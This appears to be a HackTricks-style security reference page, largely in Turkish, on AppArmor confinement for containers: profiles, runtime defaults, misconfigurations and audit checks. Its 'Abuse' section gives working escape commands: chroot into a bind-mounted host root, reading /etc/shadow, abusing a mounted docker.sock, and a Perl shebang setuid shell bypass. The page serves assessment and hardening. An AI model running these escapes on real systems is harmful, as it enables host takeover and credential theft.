# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Overview

AppArmor, program başına profiller aracılığıyla kısıtlamalar uygulayan bir Zorunlu Erişim Kontrolü (Mandatory Access Control) sistemidir. Kullanıcı ve grup sahipliğine dayanan geleneksel DAC kontrollerinin aksine, AppArmor çekirdeğin sürece eklenmiş bir politikayı zorlamasına izin verir. Container ortamlarda bu önemlidir; çünkü bir iş yükü geleneksel ayrıcalıklara sahip olup bir işlemi denemeye çalışabilir ve yine de ilgili yol, mount, ağ davranışı veya capability kullanımına izin veren AppArmor profili olmadığından reddedilebilir.

En önemli kavramsal nokta AppArmor'un **path-based** olduğudur. Dosya sistemi erişimini SELinux'un yaptığı gibi etiketler üzerinden değil, yol kuralları üzerinden değerlendirir. Bu onu hem yaklaşılabilir hem güçlü kılar; ancak bind mounts ve alternatif yol düzenlemelerinin dikkatle ele alınması gerektiği anlamına da gelir. Aynı host içeriği farklı bir yol altında erişilebilir hale gelirse, politikanın etkisi operatörün ilk beklediği gibi olmayabilir.

## Role In Container Isolation

Container güvenlik incelemeleri genellikle capabilities ve seccomp üzerinde durur, ancak AppArmor bu kontrollerden sonra da önemini korur. Diyelim ki bir container olması gerekenden daha fazla ayrıcalığa sahip veya operasyonel sebeplerle ekstra bir capability'ye ihtiyaç duyan bir iş yükü var. AppArmor yine de dosya erişimini, mount davranışını, ağ kullanımını ve yürütme desenlerini kısıtlayarak bariz kötüye kullanım yolunu engelleyebilir. Bu yüzden AppArmor'u "uygulamayı çalıştırmak için sadece" devre dışı bırakmak, sadece riskli bir yapılandırmayı sessizce aktif olarak sömürülebilir hale dönüştürebilir.

## Lab

AppArmor'un host üzerinde etkin olup olmadığını kontrol etmek için kullanın:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Mevcut container işleminin hangi kullanıcı/bağlam altında çalıştığını görmek için:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
Fark öğretici. Normal durumda, süreç runtime'ın seçtiği profile bağlı bir AppArmor bağlamı göstermelidir. Kısıtlanmamış durumda, bu ek kısıtlama katmanı ortadan kalkar.

Docker'ın ne uyguladığını da inceleyebilirsiniz:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Runtime Usage

Docker, host bunu desteklediğinde varsayılan veya özel bir AppArmor profilini uygulayabilir. Podman da AppArmor tabanlı sistemlerde AppArmor ile entegre olabilir; ancak SELinux-öncelikli dağıtımlarda diğer MAC sistemi genellikle ön plana çıkar. Kubernetes, AppArmor'u gerçekten destekleyen node'larda iş yükü düzeyinde AppArmor politikası sunabilir. LXC ve ilişkili Ubuntu-aile system-container ortamları da AppArmor'u geniş ölçüde kullanır.

Pratik olarak AppArmor bir "Docker feature" değildir. Bu, birkaç runtime'ın uygulamayı tercih edebileceği bir host-kernel özelliğidir. Eğer host bunu desteklemiyorsa veya runtime'a unconfined çalışması söylenmişse sözde koruma aslında yoktur.

AppArmor destekli Docker hostlarında en bilinen varsayılan `docker-default`'tir. Bu profil Moby'nin AppArmor template'inden üretilir ve önemlidir; çünkü bazı capability-based PoCs hâlâ varsayılan bir container içinde neden başarısız olduğunu açıklar. Genel olarak, `docker-default` normal ağ iletişimine izin verir, `/proc`'un çoğuna yazmayı engeller, `/sys`'in hassas bölümlerine erişimi reddeder, mount işlemlerini bloklar ve ptrace'i genel bir host-probing primitive olmayacak şekilde kısıtlar. Bu temel durumu anlamak, "the container has `CAP_SYS_ADMIN`" ile "the container can actually use that capability against the kernel interfaces I care about" arasındaki farkı görmeye yardımcı olur.

## Profile Management

AppArmor profilleri genellikle `/etc/apparmor.d/` altında depolanır. Yaygın bir adlandırma kuralı, çalıştırılabilir yolundaki eğik çizgileri noktalarla değiştirmektir. Örneğin, `/usr/bin/man` için bir profil genellikle `/etc/apparmor.d/usr.bin.man` olarak depolanır. Bu detay hem savunma hem de assessment sırasında önemlidir; çünkü aktif profil adını bir kez bildiğinizde, ilgili dosyayı host üzerinde genellikle hızlıca bulabilirsiniz.

Kullanışlı host-side yönetim komutları şunlardır:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
Bu komutların bir container-security referansında önemli olmasının nedeni, profillerin gerçekte nasıl oluşturulduğunu, yüklendiğini, complain mode'a geçirildiğini ve uygulama değişikliklerinden sonra nasıl değiştirildiğini açıklamalarıdır. Eğer bir operatörün sorun giderme sırasında profilleri complain mode'a geçirme ve enforcement'i geri yüklemeyi unutma alışkanlığı varsa, container belgelerde korunuyor gibi görünürken gerçekte çok daha gevşek davranabilir.

### Profil Oluşturma ve Güncelleme

`aa-genprof` uygulama davranışını gözlemleyebilir ve etkileşimli olarak bir profil oluşturulmasına yardımcı olabilir:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` daha sonra `apparmor_parser` ile yüklenebilecek bir şablon profil oluşturabilir:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Binary değiştiğinde ve politikanın güncellenmesi gerektiğinde, `aa-logprof` loglarda bulunan reddedilmeleri tekrar oynatabilir ve operatörün bunları izin verip vermemeye karar vermesinde yardımcı olabilir:
```bash
sudo aa-logprof
```
### Günlükler

AppArmor erişim reddi olayları genellikle `auditd`, syslog veya `aa-notify` gibi araçlarda görünür:
```bash
sudo aa-notify -s 1 -v
```
Bu operasyonel ve saldırgan amaçlı kullanımlarda faydalıdır. Savunucular profilleri iyileştirmek için bunu kullanır. Saldırganlar hangi kesin yolun veya işlemin engellendiğini ve AppArmor'ın exploit chain'i engelleyen kontrol olup olmadığını öğrenmek için bunu kullanır.

### Kesin Profil Dosyasını Belirleme

Bir runtime, bir konteyner için belirli bir AppArmor profil adı gösterdiğinde, genellikle bu adı disk üzerindeki profil dosyasına eşlemek faydalıdır:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Bu, özellikle host tarafı incelemelerinde çok faydalıdır çünkü "konteynerin `lowpriv` profili altında çalıştığını söylüyor" ile "gerçek kurallar denetlenebilen veya yeniden yüklenebilen bu belirli dosyada bulunuyor" arasındaki boşluğu kapatır.

## Misconfigurations

En bariz hata `apparmor=unconfined`'dir. Yöneticiler, profil tehlikeli veya beklenmeyen bir şeyi doğru şekilde engellediği için başarısız olan bir uygulamayı hata ayıklarken sıklıkla bunu ayarlarlar. Bu bayrak prodüksiyonda kalırsa, tüm MAC katmanı fiilen kaldırılmış olur.

Diğer ince bir problem, dosya izinleri normal göründüğü için bind mount'ların zararsız olduğunu varsaymaktır. AppArmor yol-tabancı olduğundan, host yollarını farklı mount konumları altında açmak path kurallarıyla kötü etkileşime girebilir. Üçüncü bir hata, bir konfigürasyon dosyasındaki profil adının host çekirdeği gerçekten AppArmor'u uygulamıyorsa çok az şey ifade ettiğini unutmaktır.

## Abuse

AppArmor yoksa, önceden kısıtlanmış işlemler aniden çalışabilir: bind mount'lar aracılığıyla hassas yolları okumak, kullanımı daha zor kalması gereken procfs veya sysfs bölümlerine erişmek, capabilities/seccomp izin veriyorsa mount ile ilgili işlemler yapmak veya normalde bir profilin reddedeceği yolları kullanmak. AppArmor genellikle, bir capability-temelli breakout denemesinin kağıt üzerinde "çalışması gerekmesine" rağmen pratikte neden başarısız olduğunu açıklayan mekanizmadır. AppArmor'u kaldırın, aynı deneme başarılı olmaya başlayabilir.

Eğer AppArmor'un bir path-traversal, bind-mount veya mount-based kötüye kullanım zincirini engelleyen ana şey olduğundan şüpheleniyorsanız, ilk adım genellikle bir profile sahipken ve profil olmadan erişilebilir olanı karşılaştırmaktır. Örneğin, bir host path konteyner içinde mount edilmişse, önce onu geçip okuyup okuyamadığınızı kontrol ederek başlayın:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Eğer container ayrıca `CAP_SYS_ADMIN` gibi tehlikeli bir capability'ye sahipse, en pratik testlerden biri AppArmor'un mount operations'ı mı yoksa hassas kernel filesystems'e erişimi mi engellediğini test etmektir:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
Bir host yolu bind mount aracılığıyla zaten kullanılabiliyorsa, AppArmor kaybı salt okunur bilgi ifşası sorununu doğrudan host dosya erişimine dönüştürebilir:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
Bu komutların amacı, AppArmor'un tek başına breakout oluşturması değildir. Amaç, AppArmor kaldırıldıktan sonra birçok dosya sistemi ve mount tabanlı kötüye kullanım yolunun hemen test edilebilir hale gelmesidir.

### Tam Örnek: AppArmor Devre Dışı + Host Root Mounted

Eğer konteynerde host root zaten `/host` olarak bind-mounted ise, AppArmor'u kaldırmak engellenmiş bir dosya sistemi kötüye kullanım yolunu tam bir host escape'e dönüştürebilir:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Shell host filesystem üzerinden çalışıyor olunca, workload etkili bir şekilde container sınırını aşmış olur:
```bash
id
hostname
cat /etc/shadow | head
```
### Tam Örnek: AppArmor Devre Dışı + Çalışma Zamanı Soketi

Gerçek engel çalışma zamanı durumunu çevreleyen AppArmor ise, bağlı bir soket tam bir kaçış için yeterli olabilir:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Tam yol bağlama noktasına bağlıdır, ancak sonuç aynıdır: AppArmor artık runtime API'ye erişimi engellemiyor ve runtime API host'u tehlikeye sokabilecek bir container başlatabilir.

### Tam Örnek: Path-Based Bind-Mount Bypass

AppArmor yol tabanlı olduğundan, `/proc/**`'i korumak aynı host procfs içeriğini farklı bir yol üzerinden erişilebilen durumlarda otomatik olarak korumaz:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
Etki, tam olarak neyin mount edildiğine ve alternatif yolun diğer kontrolleri de atlayıp atlamadığına bağlıdır; ancak bu desen, AppArmor'ın izole şekilde değil mount düzeni ile birlikte değerlendirilmesi gerektiğinin en açık nedenlerinden biridir.

### Tam Örnek: Shebang Bypass

AppArmor politikası bazen bir yorumlayıcı yolunu, shebang handling yoluyla betik çalıştırmayı tam olarak hesaba katmayacak şekilde hedefler. Tarihsel bir örnek, ilk satırı kısıtlanmış bir yorumlayıcıya işaret eden bir betik kullanmayı içeriyordu:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Bu tür bir örnek, profil niyeti ile gerçek yürütme semantiğinin ayrışabileceğini hatırlatması açısından önemlidir. Konteyner ortamlarında AppArmor'u incelerken, yorumlayıcı zincirleri ve alternatif yürütme yolları özel dikkat gerektirir.

## Kontroller

Bu kontrollerin amacı üç soruyu hızlıca yanıtlamaktır: AppArmor ana makinede etkin mi, mevcut süreç kısıtlanmış mı ve runtime gerçekten bu konteynere bir profil uyguladı mı?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
```
What is interesting here:

- If `/proc/self/attr/current` shows `unconfined`, the workload is not benefiting from AppArmor confinement.
- If `aa-status` shows AppArmor disabled or not loaded, any profile name in the runtime config is mostly cosmetic.
- If `docker inspect` shows `unconfined` or an unexpected custom profile, that is often the reason a filesystem or mount-based abuse path works.

If a container already has elevated privileges for operational reasons, leaving AppArmor enabled often makes the difference between a controlled exception and a much broader security failure.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | AppArmor-capable hostlarda varsayılan olarak etkin | Uses the `docker-default` AppArmor profile unless overridden | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Host-dependent | AppArmor `--security-opt` aracılığıyla desteklenir; tam varsayılan host/runtime'e bağlıdır ve Docker'ın belgelenmiş `docker-default` profilinden daha evrensel değildir | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Koşullu varsayılan | Eğer `appArmorProfile.type` belirtilmemişse varsayılan `RuntimeDefault`'dır; ancak bu yalnızca AppArmor node'da etkin olduğunda uygulanır | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` zayıf bir profil ile, AppArmor desteği olmayan node'lar |
| containerd / CRI-O under Kubernetes | Düğüm/runtime desteğini takip eder | Yaygın Kubernetes tarafından desteklenen runtimeler AppArmor'u destekler; ancak gerçek uygulama yine düğüm desteğine ve iş yükü ayarlarına bağlıdır | Kubernetes satırı ile aynı; doğrudan runtime yapılandırması AppArmor'u tamamen atlayabilir |

For AppArmor, the most important variable is often the **host**, not only the runtime. A profile setting in a manifest does not create confinement on a node where AppArmor is not enabled.
{{#include ../../../../banners/hacktricks-training.md}}
